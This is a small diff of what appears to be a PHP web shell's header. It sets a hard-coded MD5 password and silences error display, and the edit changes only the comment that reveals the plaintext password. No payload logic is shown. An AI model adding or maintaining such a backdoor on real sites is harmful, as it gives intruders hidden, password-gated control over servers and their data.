@@ -14,7 +14,7 @@ if(version_compare(PHP_VERSION, '5.3.0', '<')) {
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-$password = "329eadfcb8f4deee2155009da4545105"; # md5: merakxpl01t
+$password = "329eadfcb8f4deee2155009da4545105"; # md5: m01t
 
 $SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
 $FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());
